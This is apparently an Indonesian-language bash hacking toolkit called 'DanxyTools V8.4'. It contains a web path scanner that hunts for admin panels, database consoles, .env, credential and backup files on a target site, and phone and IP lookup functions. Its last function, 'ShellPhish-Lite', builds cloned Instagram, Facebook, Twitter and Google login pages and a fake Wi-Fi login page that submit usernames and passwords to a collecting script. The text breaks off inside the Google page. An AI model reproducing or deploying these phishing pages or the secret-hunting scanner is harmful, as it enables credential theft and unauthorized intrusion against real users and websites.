║                   ⠀⢿⣿⣮⣿⣿⣿⣿⣿⡇⠈⠻⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⠟⠁⢸⣿⣿⣿⣿⣿⣵⣿⡿⠁                  ║
║                   ⠀⠈⢻⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢸⣿⣿⣿⣿⣿⣿⡟⠁⠀                  ║
║                   ⠀⠀⠀⠉⠻⢿⣿⣿⣿⣧⠀⠀⡀⠀⠙⣿⣿⣿⣿⣿⣿⣿⠋⠀⢀⠀⠀⣼⣿⣿⣿⣿⠟⠉⠀⠀⠀                  ║
║                   ⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⣹⣷⣤⣈⣿⣿⣿⣿⣿⣁⣤⣾⣏⣠⣾⣿⣿⡿⠋⠀⠀⠀⠀⠀                   ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡇⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢸⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀                  ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡇⢷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡾⢸⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀                   ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡇⣈⢿⣿⣿⣿⣿⣿⣿⣿⡿⣡⢸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀                    ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                  ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                   ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                    ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⣾⣿⣿⣿⣿⣿⣿⣿⣷⠶⠀⠀⠀⠀⠀⠀⠀⠀                       ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                    ║
║                   ⠀⠀ DANXY TOOLS V8.4 SCANNER DOMAIN⠀⠀⠀⠀⠀⠀⠀⠀⠀            ║
╚══════════════════════════════════════════════════════════════════════════╝
" | lolcat
}

section_header() {
    echo -e "${LIGHT_BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${LIGHT_BLUE}║            $1${NC}"
    echo -e "${LIGHT_BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
}

status_message() {
    echo -e "${PLATINUM}▸${NC} ${SILVER}$1${NC}"
}

success_message() {
    echo -e "${EMERALD}✓${NC} ${SILVER}$1${NC}"
}

error_message() {
    echo -e "${RUBY}✗${NC} ${SILVER}$1${NC}"
}

warning_message() {
    echo -e "${GOLD}⚠${NC} ${SILVER}$1${NC}"
}

info_message() {
    echo -e "${CRYSTAL}ℹ${NC} ${SILVER}$1${NC}"
}

validate_url() {
    local url="$1"
    if [[ $url =~ ^https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/? ]]; then
        return 0
    else
        return 1
    fi
}

extract_domain() {
    local url="$1"
    protocol=$(echo "$url" | grep -oE '^https?://')
    domain=$(echo "$url" | sed -E 's/^https?:\/\///' | sed 's/\/.*//')
}

generate_paths() {
    admin_paths=(
        "admin" "administrator" "admincp" "adminpanel" "admin_area" 
        "admin-login" "admin_login" "admin1" "admin2" "admin4" 
        "admin/account" "admin/control" "admin/cp" "admin/home" 
        "admin/index" "admin/login" "admin/manage" "admin/panel" 
        "admin_area/index" "admin_area/login" "administrator/index" 
        "administrator/login" "administration" "administer" 
        "admin_console" "admin_content" "admin_dashboard" 
        "admin_center" "admin_tools" "admin-portal" "admin123" 
        "adminarea" "admincontrol" "adminlogin" "adminpanel" 
        "admins" "adm" "admm" "moderator" "mod" "superadmin" 
        "supervisor" "sysadmin" "webadmin" "root" "server-admin"
        "wp-admin" "wp-login.php" "wordpress/wp-admin" "wordpress/wp-login.php"
        "user/login" "user/admin" "admin/user" "panel/admin" "controlpanel"
        "cpanel" "whm" "webmail" "plesk" "directadmin" "vhost" "hostmaster"
    )

    cms_paths=(
        "wp-admin" "wp-login.php" "wp-content" "wp-includes" "wordpress/wp-admin"
        "joomla/administrator" "administrator/index.php" "administrator/components"
        "drupal/admin" "admin/config" "user/login" "user/register"
        "misc/drupal.js" "misc/test.html" "misc/ajax.js"
        "magento/admin" "admin/dashboard" "index.php/admin"
        "opencart/admin" "admin/index.php" "administration/index.php"
        "prestashop/admin" "admin1234" "admin12345" "backoffice"
        "umbraco" "umbraco/backoffice" "umbraco/login"
        "sitecore" "sitecore/admin" "sitecore/login"
        "hubspot" "hubspot/login" "hubspot/admin"
        "shopify/admin" "admin/shopify" "apps/shopify"
        "wix.com" "wix/admin" "editor/wix"
        "squarespace" "squarespace/admin" "squarespace/login"
        "weebly/admin" "weebly/editor" "weebly/control"
        "blogger/admin" "blogger/dashboard" "blogger/home"
        "ghost/ghost" "ghost/admin" "ghost/signin"
        "mediawp/admin" "mediawp/login" "mediawp/dashboard"
    )

    db_paths=(
        "phpmyadmin" "pma" "myadmin" "mysql" "mysqld" "mysqladmin"
        "db" "database" "dbadmin" "dba" "sql" "sqld" "sqladmin"
        "phpMyAdmin" "php-my-admin" "phppma" "pmd" "pmadmin"
        "adminer" "adminer.php" "mini.php" "editor.php"
        "dbadmin.php" "webdb" "db-web" "web/db" "db/web"
        "mongodb" "mongo" "redis" "postgresql" "postgres"
        "oracle" "sqlserver" "mssql" "sybase" "db2"
        "phpPgAdmin" "pgadmin" "pgmyadmin" "emsa" "emsa/db"
        "db/phpmyadmin" "database/phpmyadmin" "sql/phpmyadmin"
        "mysql/db" "mysql/web" "mysql/admin" "mysql/phpmyadmin"
        "phpmyadmin1" "phpmyadmin2" "phpmyadmin3" "phpmyadmin4"
        "PMA" "pma2011" "pma2012" "pma2013" "pma2014" "pma2015"
        "pma2016" "pma2017" "pma2018" "pma2019" "pma2020"
    )

    file_paths=(
        "files" "uploads" "downloads" "assets" "images" "img" "pics"
        "pictures" "photos" "gallery" "media" "videos" "audio" "music"
        "documents" "docs" "pdf" "doc" "fileshare" "shared" "share"
        "public" "public_html" "www" "web" "htdocs" "httpdocs"
        "data" "storage" "backup" "backups" "old" "temp" "tmp"
        "cache" "cached" "static" "resources" "resource" "content"
        "archive" "archives" "log" "logs" "logging" "debug" "dump"
        "export" "import" "uploadify" "uploader" "filemanager"
        "filemanager.php" "fileman" "fm" "elfinder" "ckeditor"
        "fckeditor" "tinymce" "nicedit" "fileupload" "upload"
        "multiupload" "massupload" "batchupload" "ajaxupload"
        "imageupload" "file-upload" "file-browser" "file-explorer"
        "file-download" "download-manager" "download-center"
    )

    config_paths=(
        ".env" ".env.local" ".env.production" ".env.development" ".env.test"
        "config" "configuration" "config.php" "config.json" "config.xml"
        "config.ini" "config.yml" "config.yaml" "settings.php" "settings.json"
        "configuration.php" "app.config" "web.config" "appsettings.json"
        "secrets" "secret" "keys" "key" "api-key" "apikey" "token"
        "credentials" "credential" "password" "passwd" "pwd"
        "database.php" "db.php" "db_config.php" "database.json"
        "backup.sql" "dump.sql" "export.sql" "import.sql"
        "backup.zip" "backup.tar" "backup.tar.gz" "backup.rar"
        "backup/database.sql" "backup/db.sql" "backup/data.sql"
        "sql/backup.sql" "sql/dump.sql" "database/backup.sql"
        "old/config.php" "old/settings.php" "temp/config.php"
        "tmp/settings.php" "cache/config.php" "log/config.php"
        ".git" ".git/config" ".git/HEAD" ".git/logs/HEAD"
        ".svn" ".svn/entries" ".svn/wc.db" ".hg" ".hg/store"
        ".bzr" ".bzr/branch-format" "CVS/Entries" "CVS/Root"
        ".DS_Store" "Thumbs.db" "desktop.ini" "composer.json"
        "package.json" "package-lock.json" "yarn.lock" "Gemfile"
        "Gemfile.lock" "pom.xml" "build.xml" "Makefile"
        "Dockerfile" "docker-compose.yml" ".dockerignore"
        ".htaccess" ".htpasswd" "httpd.conf" "nginx.conf"
        "apache2.conf" "web.config" "robots.txt" "sitemap.xml"
        "crossdomain.xml" "clientaccesspolicy.xml"
    )

    api_paths=(
        "api" "api/v1" "api/v2" "api/v3" "api/v4" "api/v5"
        "api/v1.0" "api/v2.0" "api/v3.0" "api/1.0" "api/2.0"
        "api/3.0" "rest" "rest/api" "rest/v1" "rest/v2" "rest/v3"
        "graphql" "graphiql" "playground" "sandbox" "explorer"
        "swagger" "swagger-ui" "swagger/docs" "swagger.json"
        "openapi" "openapi.json" "openapi.yaml" "openapi.yml"
        "docs" "documentation" "api-docs" "api/documentation"
        "v1" "v2" "v3" "v1/api" "v2/api" "v3/api"
        "json" "json/api" "xml" "xml/api" "soap" "soap/api"
        "webservice" "webservices" "web-service" "web-services"
        "endpoint" "endpoints" "rpc" "jsonrpc" "xmlrpc"
        "oauth" "oauth2" "auth" "authentication" "authorization"
        "token" "jwt" "login" "signin" "register" "signup"
        "user" "users" "profile" "profiles" "account" "accounts"
        "customer" "customers" "client" "clients" "member" "members"
    )

    webapp_paths=(
        "app" "apps" "application" "applications" "webapp" "webapps"
        "console" "cmd" "command" "cli" "shell" "terminal"
        "dashboard" "dash" "home" "main" "index" "default"
        "portal" "gateway" "entry" "access" "gate" "door"
        "login" "signin" "auth" "authenticate" "authentication"
        "logout" "signout" "exit" "quit" "leave" "bye"
        "register" "signup" "registration" "join" "create-account"
        "password" "passwd" "pwd" "forgot-password" "reset-password"
        "recover" "recovery" "restore" "change-password"
        "profile" "profiles" "user" "users" "account" "accounts"
        "settings" "preferences" "options" "configuration"
        "edit" "update" "modify" "change" "delete" "remove"
        "create" "new" "add" "insert" "save" "store"
        "search" "find" "query" "lookup" "discover"
        "browse" "explore" "navigate" "directory" "catalog"
        "list" "listing" "items" "products" "goods" "services"
        "view" "show" "display" "detail" "details" "info"
        "cart" "basket" "checkout" "payment" "pay" "purchase"
        "order" "orders" "invoice" "invoices" "receipt" "bill"
        "help" "support" "faq" "contact" "about" "info"
        "terms" "privacy" "policy" "policies" "legal"
    )

    framework_paths=(
        "laravel" "laravel/admin" "laravel/login" "laravel/dashboard"
        "artisan" "storage/logs" "storage/framework" "bootstrap/cache"
        "django" "django/admin" "admin/django" "django/contrib/admin"        
        "flask" "flask/admin" "admin/flask"        
        "rails" "rails/admin" "admin/rails" "rails/console"
        "spring" "spring-boot" "actuator" "actuator/health" "actuator/info"        
        "express" "express/admin" "admin/express"
        "angular" "angular/admin" "admin/angular"
        "react" "react/admin" "admin/react"
        "vue" "vue/admin" "admin/vue"
        "symfony" "symfony/admin" "admin/symfony"
        "codeigniter" "codeigniter/admin" "admin/codeigniter"
        "yii" "yii/admin" "admin/yii" "yii/web/admin"
        "zend" "zend/admin" "admin/zend" "zf/admin"
        "cakephp" "cake" "cake/admin" "admin/cake"
        "aspnet" "aspnet_client" "webresource.axd" "scriptresource.axd"
    )
    
    local all_paths=(
        "${admin_paths[@]}"
        "${cms_paths[@]}"
        "${db_paths[@]}"
        "${file_paths[@]}"
        "${config_paths[@]}"
        "${api_paths[@]}"
        "${webapp_paths[@]}"
        "${framework_paths[@]}"
    )
    
    printf "%s\n" "${all_paths[@]}" | sort -u
}

scan_paths() {
    local domain="$1"
    local protocol="$2"
    
    section_header "        MEMULAI PENEMUAN PATH KOMPREHENSIF"
    info_message "Target: $protocol$domain"
    info_message "Memulai enumerasi path tingkat lanjut..."
    
    mapfile -t paths < <(generate_paths)
    total_paths=${#paths[@]}
    
    status_message "Total path dalam database: $total_paths"
    status_message "Menginisialisasi mesin pemindaian..."
    warning_message "Pemindaian komprehensif sedang berjalan. Ini mungkin membutuhkan beberapa menit..."
    echo ""

    user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    
    found_count=0
    current=0
    
    for path in "${paths[@]}"; do
        ((current++))
        full_url="${protocol}${domain}/${path}"
        
        if (( current % 20 == 0 )); then
            percentage=$(( (current * 100) / total_paths ))
            completed=$(( percentage / 2 ))
            remaining=$(( 50 - completed ))
            progress_bar="[${GOLD}"
            for ((i=0; i<completed; i++)); do progress_bar+="■"; done
            progress_bar+="${PLATINUM}"
            for ((i=0; i<remaining; i++)); do progress_bar+="□"; done
            progress_bar+="${NC}]"
            
            echo -ne "\r${SILVER}Memindai: ${progress_bar} ${percentage}% [ $current/$total_paths ] 
Ditemukan: $found_count${NC}"
        fi
        
        response_code=$(curl -s -I -L --connect-timeout 5 --max-time 10 \
            -H "User-Agent: $user_agent" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            -w "%{http_code}" \
            -o /dev/null \
            "$full_url" 2>/dev/null)
        
        if [[ ! -z "$response_code" && "$response_code" != "404" ]]; then
            ((found_count++))
            case $response_code in
                2*)
                    echo -e "\r${EMERALD}🛡️  AKSES AMAN      ${SILVER}$response_code${NC} ${CRYSTAL}${full_url}${NC}"
                    ;;
                3*)
                    echo -e "\r${LIGHT_BLUE}[ ∅ ] PENGALIHAN     ${SILVER}$response_code${NC} ${CRYSTAL}${full_url}${NC}"
                    ;;
                401)
                    echo -e "\r${GOLD}🔐 PERLU AUTH      ${SILVER}$response_code${NC} ${CRYSTAL}${full_url}${NC}"
                    ;;
                403)
                    echo -e "\r${RUBY}🚫 DILARANG        ${SILVER}$response_code${NC} ${CRYSTAL}${full_url}${NC}"
                    ;;
                500)
                    echo -e "\r${DARK_BLUE}⚡ ERROR SERVER   ${SILVER}$response_code${NC} ${CRYSTAL}${full_url}${NC}"
                    ;;
                *)
                    echo -e "\r${PLATINUM}📊 KODE RESPON    ${SILVER}$response_code${NC} ${CRYSTAL}${full_url}${NC}"
                    ;;
            esac
        fi
    done
    
    echo -e "\n"
    section_header "                  PEMINDAIAN SELESAI"
    success_message "Total path yang dapat diakses ditemukan: $found_count"
    success_message "Pemindaian selesai pada: $(date)"
}

save_results() {
    local domain="$1"
    local protocol="$2"
    
    section_header "                    EKSPOR HASIL"
    info_message "Apakah Anda ingin mengekspor hasil ke file? (y/n)"
    read -p "$(echo -e "${GOLD}▸ ${SILVER}")" save_choice
    
    if [[ "$save_choice" =~ ^[Yy]$ ]]; then
        filename="pathscan_${domain}_$(date +%Y%m%d_%H%M%S).txt"
        status_message "Membuat file ekspor: $filename"
        
        {
            echo "╔══════════════════════════════════════════════════════════════════════════╗"
            echo "║                                     LAPORAN HASIL PATH SCAN                     ║"
            echo "║                                           EDISI PREMIUM                            ║"
            echo "╚══════════════════════════════════════════════════════════════════════════╝"
            echo ""
            echo "Target Domain: $protocol$domain"
            echo "Tanggal Pemindaian: $(date)"
            echo "Dibuat Oleh: DanxyTools V8.4 Scanner Domain Paths"
            echo "══════════════════════════════════════════════════════════════════"
            echo ""
        } > "$filename"
        
        mapfile -t paths < <(generate_paths)
        
        user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        
        for path in "${paths[@]}"; do
            full_url="${protocol}${domain}/${path}"
            response_code=$(curl -s -I -L --connect-timeout 5 --max-time 10 \
                -H "User-Agent: $user_agent" \
                -w "%{http_code}" \
                -o /dev/null \
                "$full_url" 2>/dev/null)
            
            if [[ ! -z "$response_code" && "$response_code" != "404" ]]; then
                echo "$response_code - $full_url" >> "$filename"
            fi
        done
        
        success_message "Hasil berhasil diekspor ke: $filename"
        info_message "Lokasi file: $(pwd)/$filename"
    else
        warning_message "Ekspor hasil dibatalkan oleh pengguna"
    fi
}

show_help() {
    section_header "DanxyTools V8.4 Scanner Domain Paths"
    
    echo -e "${SILVER}"
    cat << "EOF"
DESKRIPSI:
  Alat penemuan path web tingkat lanjut yang dirancang untuk profesional
  keamanan dan penetration tester. Menampilkan database path komprehensif
  dengan kemampuan pemindaian cerdas.

FITUR:
  ✓ 1000+ path yang dikurasi dengan hati-hati di berbagai kategori
  ✓ Pelacakan progress tingkat lanjut dengan indikator visual
  ✓ Respons status HTTP dengan kode warna
  ✓ Ekspor hasil profesional
  ✓ Simulasi user agent tingkat enterprise
  ✓ Enumerasi path multi-kategori

KATEGORI YANG DISERTAKAN:
  • Antarmuka Administratif
  • Panel Manajemen CMS
  • Titik Akses Database
  • Sistem Manajemen File
  • File Konfigurasi & Backup
  • Endpoint API & Layanan Web
  • Path Spesifik Framework
  • Path Umum Aplikasi Web

CONTOH PENGGUNAAN:
  https://target-domain.com
  http://test-site.net
  example.org (otomatis https)

PEMBERITAHUAN KEAMANAN:
  Alat ini ditujukan untuk pengujian keamanan yang sah dan
  tujuan pendidikan saja. Selalu pastikan Anda memiliki
  otorisasi yang tepat sebelum memindai target apa pun.

EOF
    echo -e "${NC}"
}

path_scanner_main() {
    while true; do
        show_premium_header
        
        echo -e "${GOLD}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GOLD}║                             SPESIFIKASI TARGET                           ║${NC}"
        echo -e "${GOLD}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        
        info_message "Masukkan domain target (contoh: https://example.com)"
        info_message "Ketik '0' untuk kembali ke menu utama"
        echo ""
        printf "${GREEN} ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MASUKAN DOMAIN${YELLOW}${RED}]${NC}${GREEN}\n ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} " 
        read -r target_url
        

        if [[ "$target_url" == "0" ]]; then
            info_message "Kembali ke menu utama..."
            return 0
        fi

        if [[ -z "$target_url" ]]; then
            error_message "Domain tidak boleh kosong. Silakan coba lagi."
            echo ""
            continue
        fi

        if [[ ! "$target_url" =~ ^https?:// ]]; then
            target_url="https://$target_url"
            warning_message "Protokol otomatis dikoreksi menjadi: $target_url"
        fi

        if ! validate_url "$target_url"; then
            error_message "Format domain tidak valid. Silakan periksa URL dan coba lagi."
            echo ""
            continue
        fi

        extract_domain "$target_url"

        section_header "                 VERIFIKASI TARGET"
        success_message "Target Terverifikasi: $protocol$domain"
        info_message "Protokol: $protocol"
        info_message "Domain: $domain"

        scan_paths "$domain" "$protocol"
        
        save_results "$domain" "$protocol"

        echo -e "\n"
        section_header "                    MISI SELESAI"
        success_message "Semua tugas assessment keamanan berhasil diselesaikan!"
        info_message "Terima kasih telah menggunakan DanxyTools V8.4 Scanner Domain Paths"
        
        echo ""
        info_message "Tekan Enter untuk memindai target lain atau ketik '0' untuk kembali ke menu"
        read -p "$(echo -e "${GOLD}▸ ${SILVER}")" choice
        if [[ "$choice" == "0" ]]; then
            return 0
        fi
    done
}

check_dependencies() {
    if ! command -v curl &> /dev/null; then
        error_message "cURL diperlukan tetapi tidak terinstall."
        info_message "Install dengan: apt-get install curl || yum install curl || brew install curl"
        return 1
    fi
    return 0
}

if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    show_help
    exit 0
fi






phone_track() {
banner_big
  echo -ne "\n${WHT}MASUKAN NOMOR${GRN}Ex [+6281xxxxxxxxx] ${WHT}: ${GRN}"
  read -r phone
  echo -e "\n${WHT}========== ${GRN}SHOW INFORMATION PHONE NUMBERS ${WHT}=========="
  # Using libphonenumber-js via node (install with: npm i -g libphonenumber-js)
  node - << "EOF" "$phone"
const parsePhoneNumber = require('libphonenumber-js');
const input = process.argv[2];
try {
  const pn = parsePhoneNumber(input);
  if (!pn) { console.log('Invalid number'); process.exit(1); }
  console.log(`Location             : ${pn.getRegionCode()}`);
  console.log(`Carrier              : ${pn.getCarrierCode() || 'N/A'}`);
  console.log(`Valid number         : ${pn.isValid()}`);
  console.log(`International format : ${pn.formatInternational()}`);
  console.log(`E.164 format         : ${pn.format('E164')}`);
  console.log(`Type                 : ${pn.getType()}`);
} catch (e) {
  console.error('Error parsing number', e.message);
}
EOF
}
ip_track() {
banner_big

  echo -ne "\n${WHT}Enter IP target : ${GRN}"
  read -r ip
  echo -e "\n${WHT}============= ${GRN}SHOW INFORMATION IP ADDRESS ${WHT}=============${RST}"
  data=$(curl -s "http://ipwho.is/${ip}")
  echo -e "${WHT}\n IP target       : ${GRN}${ip}"
  echo -e "${WHT} Type IP         : ${GRN}$(echo "$data" | jq -r '.type')"
  echo -e "${WHT} Country         : ${GRN}$(echo "$data" | jq -r '.country')"
  echo -e "${WHT} Country Code    : ${GRN}$(echo "$data" | jq -r '.country_code')"
  echo -e "${WHT} City            : ${GRN}$(echo "$data" | jq -r '.city')"
  echo -e "${WHT} Continent       : ${GRN}$(echo "$data" | jq -r '.continent')"
  echo -e "${WHT} Continent Code  : ${GRN}$(echo "$data" | jq -r '.continent_code')"
  echo -e "${WHT} Region          : ${GRN}$(echo "$data" | jq -r '.region')"
  echo -e "${WHT} Region Code     : ${GRN}$(echo "$data" | jq -r '.region_code')"
  echo -e "${WHT} Latitude        : ${GRN}$(echo "$data" | jq -r '.latitude')"
  echo -e "${WHT} Longitude       : ${GRN}$(echo "$data" | jq -r '.longitude')"
  lat=$(echo "$data" | jq -r '.latitude')
  lon=$(echo "$data" | jq -r '.longitude')
  echo -e "${WHT} Maps            : ${GRN}https://www.google.com/maps/@${lat},${lon},8z"
  echo -e "${WHT} EU              : ${GRN}$(echo "$data" | jq -r '.is_eu')"
  echo -e "${WHT} Postal          : ${GRN}$(echo "$data" | jq -r '.postal')"
  echo -e "${WHT} Calling Code    : ${GRN}$(echo "$data" | jq -r '.calling_code')"
  echo -e "${WHT} Capital         : ${GRN}$(echo "$data" | jq -r '.capital')"
  echo -e "${WHT} Borders         : ${GRN}$(echo "$data" | jq -r '.borders')"
  echo -e "${WHT} Country Flag    : ${GRN}$(echo "$data" | jq -r '.flag.emoji')"
  echo -e "${WHT} ASN             : ${GRN}$(echo "$data" | jq -r '.connection.asn')"
  echo -e "${WHT} ORG             : ${GRN}$(echo "$data" | jq -r '.connection.org')"
  echo -e "${WHT} ISP             : ${GRN}$(echo "$data" | jq -r '.connection.isp')"
  echo -e "${WHT} Domain          : ${GRN}$(echo "$data" | jq -r '.connection.domain')"
  echo -e "${WHT} Timezone ID     : ${GRN}$(echo "$data" | jq -r '.timezone.id')"
  echo -e "${WHT} ABBR            : ${GRN}$(echo "$data" | jq -r '.timezone.abbr')"
  echo -e "${WHT} DST             : ${GRN}$(echo "$data" | jq -r '.timezone.is_dst')"
  echo -e "${WHT} Offset          : ${GRN}$(echo "$data" | jq -r '.timezone.offset')"
  echo -e "${WHT} UTC             : ${GRN}$(echo "$data" | jq -r '.timezone.utc')"
  echo -e "${WHT} Current Time    : ${GRN}$(echo "$data" | jq -r '.timezone.current_time')"
}

#!/bin/bash
phising_allsosmed() {
    # ---------- warna ----------
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'; CYAN='\033[0;36m'; RESET='\033[0m'
    clear
    echo -e "${CYAN}"
    figlet -f small "ShellPhish-Lite" 2>/dev/null || echo -e "=== ShellPhish-Lite ===\n"
    echo -e "${RESET}"

    # ---------- dependensi ----------
    for dep in php curl openssh; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${YELLOW}[+] Installing $dep...${RESET}"
            pkg install "$dep" -y || apt install "$dep" -y
        fi
    done

    # ---------- daftar target ----------
    sites=(
        "instagram" "facebook" "twitter" "google" "netflix"
        "snapchat" "github" "spotify" "linkedin"
        "yahoo" "microsoft" "create"
    )

    echo -e "${GREEN}Pilih target:${RESET}"
    for i in "${!sites[@]}"; do
        printf "%2s) %-15s" "$((i+1))" "${sites[$i]}"
        (( (i+1) % 3 == 0 )) && echo
    done
    echo

    read -p "Pilih [1-${#sites[@]}]: " opt
    [[ ! "$opt" =~ ^[0-9]+$ ]] || (( opt < 1 || opt > ${#sites[@]} )) && {
        echo -e "${RED}Pilihan salah!${RESET}"
        return 1
    }

    server="${sites[$((opt-1))]}"

    # ---------- custom page ----------
    [[ "$server" == "create" ]] && {
        mkdir -p sites/create
        cat > sites/create/index.html <<'EOF'
<!DOCTYPE html>
<html><body bgcolor="#2c3e50" text="#ecf0f1">
<center><h2>Wi-Fi Expired<br>Please login again.</h2></center>
<form method="POST" action="login.php">
<label>Username: </label><input name="username"><br>
<label>Password: </label><input type="password" name="password"><br><br>
<input type="submit" value="Log-In">
</form></body></html>
EOF
    }

    # ---------- folder kerja ----------
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)" || SCRIPT_DIR="$PWD"
    LOG_DIR="$SCRIPT_DIR/logs"
    mkdir -p "$LOG_DIR"

    port=3333
    dir="sites/$server"
    mkdir -p "$dir"
    cd "$dir" || { echo -e "${RED}Gagal masuk ke $dir${RESET}"; return 1; }

    # ---------- template 1:1 sesuai target ----------
    case "$server" in
        instagram)
            cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Instagram</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet">
<style>body{background:#fafafa;font-family:'Roboto',sans-serif;margin:0}.wrapper{max-width:350px;margin:60px auto;padding:0 20px}.logo{width:100%;max-width:175px;margin-bottom:30px}.box{background:#fff;border:1px solid #dbdbdb;padding:40px 30px;text-align:center;border-radius:3px}input{width:100%;padding:10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px}button{width:100%;padding:8px;background:#0095f6;border:none;border-radius:4px;color:#fff;font-weight:600;margin-top:10px;font-size:14px;cursor:pointer}.footer{margin-top:40px;color:#8e8e8e;font-size:12px;text-align:center}a{color:#00376b;text-decoration:none;font-weight:600}</style></head><body>
<div class="wrapper"><div class="box">
<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/175px-Instagram_logo.svg.png" alt="Instagram">
<form action="login.php" method="POST">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<p style="margin-top:20px"><a href="#">Forgot password?</a></p></div>
<div class="footer">Instagram from Meta</div></div></body></html>
EOF
            ;;
        facebook)
            cat > index.html <<'EOF'
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Facebook – log in or sign up</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;padding:0;font-family:Helvetica,Arial,sans-serif;background:#f0f2f5}.wrapper{max-width:400px;margin:80px auto;padding:0 20px}.logo{width:240px;margin-bottom:20px}.box{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,.1)}input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px}button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}</style></head><body>
<center><img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"></center>
<div class="wrapper"><div class="box">
<form action="login.php" method="POST">
<input type="text" name="username" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></div></body></html>
EOF
            ;;
        twitter)
            cat > index.html <<'EOF'
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Twitter</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;font-family:Arial;background:#fff;display:flex;align-items:center;justify-content:center;height:100vh}.box{width:400px;padding:40px}.logo{width:40px;margin-bottom:20px}h2{font-size:23px;margin-bottom:30px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:16px}button{width:100%;padding:12px;background:#1da1f2;color:#fff;border:none;border-radius:25px;font-size:15px;font-weight:bold;cursor:pointer}</style></head><body>
<div class="box">
<center><img class="logo" src="https://abs.twimg.com/icons/apple-touch-icon-192x192.png"></center>
<h2>Log in to Twitter</h2>
<form action="login.php" method="POST">
<input type="text" name="username" placeholder="Phone, email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button>
</form></div></body></html>
EOF
            ;;
        google)
            cat > index.html <<'EOF'
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Gmail: Email from Google</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;font-family:'Google Sans',Arial;background:#fff}.wrapper{max-width:450px;margin:80px auto;padding:0 20px}.logo{width:120px;margin-bottom:25px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}</style></head><body>
<center><img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"></center>
<div class="wrapper">
<form action="login.php" method="POST">
